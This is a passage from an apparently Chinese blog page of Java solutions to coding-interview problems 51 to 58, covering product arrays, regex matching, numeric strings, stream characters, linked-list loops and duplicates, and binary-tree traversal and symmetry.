HashMap&lt;Integer, Boolean&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.get(numbers[i]) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                map.put(numbers[i], <span class="keyword">true</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (map.get(numbers[i])) &#123;</span><br><span class="line">                <span class="comment">//第一个重复的数放到duplication[0]返回</span></span><br><span class="line">                duplication[<span class="number">0</span>] = numbers[i];</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="51-构建乘积数组"><a href="#51-构建乘积数组" class="headerlink" title="51.构建乘积数组"></a>51.构建乘积数组</h3><h4 id="标签：【数组】-9"><a href="#标签：【数组】-9" class="headerlink" title="标签：【数组】"></a>标签：【数组】</h4><h4 id="题目描述-50"><a href="#题目描述-50" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>给定一个数组A[0,1,…,n-1],请构建一个数组B[0,1,…,n-1],其中B中的元素B[i]=A[0]<em>A[1]</em>…<em>A[i-1]</em>A[i+1]<em>…</em>A[n-1]。不能使用除法。（注意：规定B[0] = A[1] <em> A[2] </em> … <em> A[n-1]，B[n-1] = A[0] </em> A[1] <em> … </em> A[n-2];）</p><p>对于A长度为1的情况，B无意义，故而无法构建，因此该情况不会存在。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*暴力计算就完了</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] multiply(<span class="keyword">int</span>[] A) &#123;</span><br><span class="line">     <span class="keyword">int</span> B[]=<span class="keyword">new</span> <span class="keyword">int</span>[A.length];</span><br><span class="line">     <span class="keyword">int</span> shunxu[] =<span class="keyword">new</span> <span class="keyword">int</span>[A.length];</span><br><span class="line">     <span class="keyword">int</span> nixu[] =<span class="keyword">new</span> <span class="keyword">int</span>[A.length];</span><br><span class="line">     <span class="keyword">int</span> temp_shun=<span class="number">1</span>;</span><br><span class="line">     <span class="keyword">int</span> temp_ni=<span class="number">1</span>;</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;A.length;i++)&#123;</span><br><span class="line">         temp_shun*=A[i];</span><br><span class="line">         shunxu[i]=temp_shun;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> j=A.length-<span class="number">1</span>;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line">         temp_ni*=A[j];</span><br><span class="line">         nixu[j]=temp_ni;</span><br><span class="line">     &#125;</span><br><span class="line">     B[<span class="number">0</span>]=nixu[<span class="number">1</span>];</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;A.length-<span class="number">1</span>;k++)&#123;</span><br><span class="line">         B[k]=shunxu[k-<span class="number">1</span>]*nixu[k+<span class="number">1</span>];</span><br><span class="line">     &#125;</span><br><span class="line">     B[A.length-<span class="number">1</span>]=shunxu[A.length-<span class="number">2</span>];</span><br><span class="line">     <span class="keyword">return</span> B;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="52-正则表达式匹配"><a href="#52-正则表达式匹配" class="headerlink" title="52.正则表达式匹配"></a>52.正则表达式匹配</h3><h4 id="标签：【字符串】-5"><a href="#标签：【字符串】-5" class="headerlink" title="标签：【字符串】"></a>标签：【字符串】</h4><h4 id="题目描述-51"><a href="#题目描述-51" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>请实现一个函数用来匹配包括’.’和’<em>‘的正则表达式。模式中的字符’.’表示任意一个字符，而’</em>‘表示它前面的字符可以出现任意次（包含0次）。 在本题中，匹配是指字符串的所有字符匹配整个模式。例如，字符串”aaa”与模式”a.a”和”ab<em>ac</em>a”匹配，但是与”aa.a”和”ab*a”均不匹配</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">matchStr</span><span class="params">(<span class="keyword">char</span>[] str, <span class="keyword">int</span> i, <span class="keyword">char</span>[] pattern, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 边界</span></span><br><span class="line">        <span class="keyword">if</span> (i == str.length &amp;&amp; j == pattern.length) &#123; </span><br><span class="line">            <span class="comment">// 字符串和模式串都为空</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j == pattern.length) &#123; </span><br><span class="line">            <span class="comment">// 模式串为空</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">boolean</span> next = (j + <span class="number">1</span> &lt; pattern.length &amp;&amp; pattern[j + <span class="number">1</span>] == <span class="string">'*'</span>); </span><br><span class="line">        <span class="comment">// 模式串下一个字符是'*'</span></span><br><span class="line">        <span class="keyword">if</span> (next) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; str.length &amp;&amp; (pattern[j] == <span class="string">'.'</span> || str[i] == pattern[j])) &#123;</span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">      * 要保证i&lt;str.length，否则越界。</span></span><br><span class="line"><span class="comment">      * 出现了'*'，而且i和j指向的相等（这里的相等可以是真正的相等，也可以是'.'标记的相等）。</span></span><br><span class="line"><span class="comment">      * 比如abcd和ab*cf，其中i和j都指向了b。此时应该i+1和j+2。比如abbcd和ab*cf，其中i和j都指向了b。</span></span><br><span class="line"><span class="comment">      * 由于b出现了多次，应该不着急移动j，所以此时i+1即可。</span></span><br><span class="line"><span class="comment">      * 比如"cba","cb*a*a"，我也可以认为，j指向的第1个a没出现过，即使你相等。因此此时可以i不动，j+2。</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">            <span class="keyword">return</span> matchStr(str, i, pattern, j + <span class="number">2</span>) || matchStr(str, i + <span class="number">1</span>, pattern, j);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> matchStr(str, i, pattern, j + <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; str.length &amp;&amp; (pattern[j] == <span class="string">'.'</span> || str[i] == pattern[j])) &#123;</span><br><span class="line">                <span class="keyword">return</span> matchStr(str, i + <span class="number">1</span>, pattern, j + <span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">match</span><span class="params">(<span class="keyword">char</span>[] str, <span class="keyword">char</span>[] pattern)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> matchStr(str, <span class="number">0</span>, pattern, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="53-表示数值的字符串"><a href="#53-表示数值的字符串" class="headerlink" title="53.表示数值的字符串"></a>53.表示数值的字符串</h3><h4 id="标签：【字符串】-6"><a href="#标签：【字符串】-6" class="headerlink" title="标签：【字符串】"></a>标签：【字符串】</h4><h4 id="题目描述-52"><a href="#题目描述-52" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>请实现一个函数用来判断字符串是否表示数值（包括整数和小数）。例如，字符串”+100”,”5e2”,”-123”,”3.1416”和”-1E-16”都表示数值。 但是”12e”,”1a3.14”,”1.2.3”,”+-5”和”12e+4.3”都不是。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isNumeric</span><span class="params">(<span class="keyword">char</span>[] str)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        使用正则表达式</span></span><br><span class="line"><span class="comment">        [\\+\\-]?            -&gt; 正或负符号出现与否</span></span><br><span class="line"><span class="comment">        \\d*                 -&gt; 整数部分是否出现，如-.34 或 +3.34均符合</span></span><br><span class="line"><span class="comment">        (\\.\\d+)?           -&gt; 如果出现小数点，那么小数点后面必须有数字；</span></span><br><span class="line"><span class="comment">                                否则一起不出现</span></span><br><span class="line"><span class="comment">        ([eE][\\+\\-]?\\d+)? -&gt; 如果存在指数部分，那么e或E肯定出现，+或-可以不出现，</span></span><br><span class="line"><span class="comment">                            紧接着必须跟着整数；或者整个部分都不出现</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">        String string = String.valueOf(str);</span><br><span class="line">        <span class="keyword">return</span> string.matches(<span class="string">"[\\+\\-]?\\d*(\\.\\d+)?([eE][\\+\\-]?\\d+)?"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="54-字符流中第一个不重复的字符"><a href="#54-字符流中第一个不重复的字符" class="headerlink" title="54.字符流中第一个不重复的字符"></a>54.字符流中第一个不重复的字符</h3><h4 id="标签：【字符串】-7"><a href="#标签：【字符串】-7" class="headerlink" title="标签：【字符串】"></a>标签：【字符串】</h4><h4 id="题目描述-53"><a href="#题目描述-53" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>请实现一个函数用来找出字符流中第一个只出现一次的字符。例如，当从字符流中只读出前两个字符”go”时，第一个只出现一次的字符是”g”。当从该字符流中读出前六个字符“google”时，第一个只出现一次的字符是”l”。</p><p>输出描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 如果当前字符流没有存在出现一次的字符，返回#字符。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">//Insert one char from stringstream</span></span><br><span class="line">    String input = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">char</span>[] count = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Insert</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</span><br><span class="line">        input += ch;</span><br><span class="line">        <span class="comment">//char型的数可以看成一个整数，计算机里保存char也是保存数值的</span></span><br><span class="line">        count[ch]++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//return the first appearence once char in current stringstream</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">FirstAppearingOnce</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; input.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (count[input.charAt(i)] == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> input.charAt(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'#'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="55-链表中环的入口结点"><a href="#55-链表中环的入口结点" class="headerlink" title="55.链表中环的入口结点"></a>55.链表中环的入口结点</h3><h4 id="标签：【链表】-6"><a href="#标签：【链表】-6" class="headerlink" title="标签：【链表】"></a>标签：【链表】</h4><h4 id="题目描述-54"><a href="#题目描述-54" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>给一个链表，若其中包含环，请找出该链表的环的入口结点，否则，输出null。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> public class ListNode &#123;</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    ListNode next = null;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    ListNode(int val) &#123;</span></span><br><span class="line"><span class="comment">        this.val = val;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*快慢指针法：step1.快指针每次走两步，慢指针每次走一步，直到两指针相遇；</span></span><br><span class="line"><span class="comment">*   step2.快指针从链表头开始以一步的步长移动，慢指针从相遇点开始以一步的步长移动，等再次相遇的时</span></span><br><span class="line"><span class="comment">*                候，相遇点即链表环的入口。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">EntryNodeOfLoop</span><span class="params">(ListNode pHead)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pHead == <span class="keyword">null</span> || pHead.next == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode fast = pHead;</span><br><span class="line">        ListNode slow = pHead;</span><br><span class="line">        <span class="keyword">if</span> (fast.next != <span class="keyword">null</span> &amp;&amp; fast.next.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            <span class="keyword">while</span> (fast != slow &amp;&amp; fast != <span class="keyword">null</span> &amp;&amp; fast.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">                fast = fast.next.next;</span><br><span class="line">                slow = slow.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (fast != <span class="keyword">null</span> &amp;&amp; fast.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">                fast = pHead;</span><br><span class="line">                <span class="keyword">while</span> (fast != slow) &#123;</span><br><span class="line">                    fast = fast.next;</span><br><span class="line">                    slow = slow.next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> fast;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="56-删除链表中重复的结点"><a href="#56-删除链表中重复的结点" class="headerlink" title="56.删除链表中重复的结点"></a>56.删除链表中重复的结点</h3><h4 id="标签：【链表】-7"><a href="#标签：【链表】-7" class="headerlink" title="标签：【链表】"></a>标签：【链表】</h4><h4 id="题目描述-55"><a href="#题目描述-55" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>在一个排序的链表中，存在重复的结点，请删除该链表中重复的结点，重复的结点不保留，返回链表头指针。 例如，链表1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5 处理后为 1-&gt;2-&gt;5</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> public class ListNode &#123;</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    ListNode next = null;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    ListNode(int val) &#123;</span></span><br><span class="line"><span class="comment">        this.val = val;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">deleteDuplication</span><span class="params">(ListNode pHead)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pHead == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> pHead;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//哨兵结点，主要是为了返回调整后的链表头结点方便</span></span><br><span class="line">        ListNode head = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">//保留当前调整结点的前驱结点信息，前驱结点的后继指针可能要调整</span></span><br><span class="line">        ListNode pre = head;</span><br><span class="line">        <span class="comment">//正在处理的结点</span></span><br><span class="line">        ListNode curr = pHead;</span><br><span class="line">        head.next = pHead;</span><br><span class="line">        <span class="keyword">while</span> (curr != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (curr.next != <span class="keyword">null</span> &amp;&amp; curr.val == curr.next.val) &#123;</span><br><span class="line">                curr = curr.next;</span><br><span class="line">                <span class="keyword">while</span> (curr.next != <span class="keyword">null</span> &amp;&amp; curr.val == curr.next.val) &#123;</span><br><span class="line">                    curr = curr.next;</span><br><span class="line">                &#125;</span><br><span class="line">                curr = curr.next;</span><br><span class="line">                pre.next = curr;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                pre = curr;</span><br><span class="line">                curr = curr.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="57-二叉树的下一个结点"><a href="#57-二叉树的下一个结点" class="headerlink" title="57.二叉树的下一个结点"></a>57.二叉树的下一个结点</h3><h4 id="标签：【树】-4"><a href="#标签：【树】-4" class="headerlink" title="标签：【树】"></a>标签：【树】</h4><h4 id="题目描述-56"><a href="#题目描述-56" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>给定一个二叉树和其中的一个结点，请找出中序遍历顺序的下一个结点并且返回。注意，树中的结点不仅包含左右子结点，同时包含指向父结点的指针。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">public class TreeLinkNode &#123;</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    TreeLinkNode left = null;</span></span><br><span class="line"><span class="comment">    TreeLinkNode right = null;</span></span><br><span class="line"><span class="comment">    //父结点</span></span><br><span class="line"><span class="comment">    TreeLinkNode next = null;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    TreeLinkNode(int val) &#123;</span></span><br><span class="line"><span class="comment">        this.val = val;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeLinkNode <span class="title">GetNext</span><span class="params">(TreeLinkNode pNode)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pNode == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//以pNode为开始结点的树有右子树的话，中序遍历的下一个结点是右子树的最左孩子结点</span></span><br><span class="line">        <span class="keyword">if</span> (pNode.right != <span class="keyword">null</span>) &#123;</span><br><span class="line">            pNode = pNode.right;</span><br><span class="line">            <span class="keyword">while</span> (pNode.left != <span class="keyword">null</span>) &#123;</span><br><span class="line">                pNode = pNode.left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> pNode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//pNode有父结点的情况</span></span><br><span class="line">        <span class="keyword">while</span> (pNode.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//当pNode是其父结点的左孩子时，父结点为中序遍历的下一个结点</span></span><br><span class="line">            <span class="keyword">if</span> (pNode.next.left == pNode) &#123;</span><br><span class="line">                <span class="keyword">return</span> pNode.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//否则，将当前查询结点设为其父结点，继续进行查找</span></span><br><span class="line">            pNode = pNode.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//pNode无父结点情况</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="58-对称的二叉树"><a href="#58-对称的二叉树" class="headerlink" title="58.对称的二叉树"></a>58.对称的二叉树</h3><h4 id="标签：【树】-5"><a href="#标签：【树】-5" class="headerlink" title="标签：【树】"></a>标签：【树】</h4><h4 id="题目描述-57"><a href="#题目描述-57" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>请实现一个函数，用来判断一棵二叉树是不是对称的。注意，如果一个二叉树同此二叉树的镜像是同样的，定义其为对称的。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">public class TreeNode &#123;</span></span><br><span class="line"><span class="comment">    int val = 0;</span></span><br><span class="line"><span class="comment">    TreeNode left = null;</span></span><br><span class="line"><span class="comment">    TreeNode right = null;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    public TreeNode(int val) &#123;</span></span><br><span class="line"><span class="comment">        this.val = val;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isSymmetrical</span><span class="params">(TreeNode pRoot)</span> </span>&#123;</span><br><span class="line">        TreeNode copy = copyTree(pRoot);</span><br><span class="line">        mirrorTree(pRoot);</span><br><span class="line">        <span class="keyword">return</span> compare(pRoot, copy);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 